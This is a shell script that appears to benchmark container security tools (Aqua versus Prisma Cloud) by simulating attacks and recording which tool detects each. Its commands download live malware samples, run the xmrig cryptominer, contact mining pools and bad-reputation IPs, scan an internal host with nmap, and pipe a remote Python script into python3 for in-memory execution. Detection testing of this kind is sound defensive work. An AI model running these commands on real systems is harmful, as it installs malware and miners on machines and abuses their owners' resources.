# Executable creation
# Both solutions detect the exec creation
echo "#include <stdio.h>\n int main() { printf(\"Hello, World!\"); return 0; }" > /home/app/main2.c
gcc /home/app/main2.c -o /home/app/main2.o

# Modified binary
# Only Aqua detects the binary modification
cat /home/app/main2.o >> /home/app/main.o
/home/app/main.o
echo "Finished execution of entrypoint script"

# Dropper & Known malware
# Both solution detect the dropper
wget https://github.com/FaridArbai/mws/raw/master/original_malware_433

# Dropper & Unknown malware
# Aqua detects the three (plane and mutated compressed with and without extension), PC only detects plane without compression
wget https://github.com/FaridArbai/mws/raw/master/mutated_malware_433
wget https://github.com/FaridArbai/mws/raw/master/mutatedtar
wget https://github.com/FaridArbai/mws/raw/master/mutatedmalware.tar

# Bad reputation communication
# Only Aqua detects the bad reputated communication
curl 141.98.10.57 &
curl 192.241.217.0 &
curl 199.19.226.13 &
curl 111.7.96.0 &
curl us-west.minexmr.com &
curl pool.minexmr.com &
curl br.stratum.slushpool.com:3333 &
curl us-east.stratum.slushpool.com:3333 &
curl btc.ss.poolin.me:1883 &
curl us-eth.2miners.com:2020 &

# Load a kernel module
# Both PC and Aqua detect the Kernel module being loaded/unloaded
modprobe iptable_nat
modprobe iptable_security
modprobe -r msr

# Dropper & Cryptominer
# Both PC and Aqua detect the dropper & cryptominer
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar -xvf xmrig*
cd xmrig-6.18.0
./xmrig &

# Dropper and Scan
# Only Aqua detects the scan
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
chmod +x ./nmap
./nmap 172.16.0.1

# Suspicious behaviour
# Only Aqua detects the process listing as suspicious
ps >> pfile
ps aux >> pfile
rm pfile

# File less
# Both PC and Aqua detect the malware being loaded into memory and the execution from memory
curl -fsSL https://github.com/FaridArbai/mws/raw/master/exec_elf_in_memory.py | python3

# Download rare malware samples to check for detection accuracy
# Prisma Cloud detects the *7494 sample, Aqua detects none

wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2021.04.15_CISA-SUNSHUTTLE/6b01eeef147d9e0cd6445f90e55e467b930df2de5d74e3d2f7610e80f2c5a2cd
wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2021.01.25_Google-Campaign_Targeting_Security_Researchers/4c3499f3cc4a4fdc7e67417e055891c78540282dccc57e37a01167dfe351b244
wget https://github.com/ytisf/theZoo/raw/master/malware/Binaries/Win32.BigBang/Win32.BigBang.zip
unzip -P infected Win32.BigBang.zip
wget https://github.com/fabrimagic72/malware-samples/raw/master/Spam/Paypal/Paypal.zip
unzip -P infected Paypal.zip
wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.09.18_Checkpoint-Rampant_Kitten/1b8cd7c93dce63878dadae0cf77482ae367477841a4604c6a842158466790737
wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.12.17_ClearSky-Pay2Kitten/df86cd16a3008dba00590edae31d1313bd92528aca92c4f4ea7f24000ba62547
wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.07.16_CISA-WELLMAIL/0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494
wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.09.15_CISA-MAR-10297887_Iranian_Web_Shells/10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334
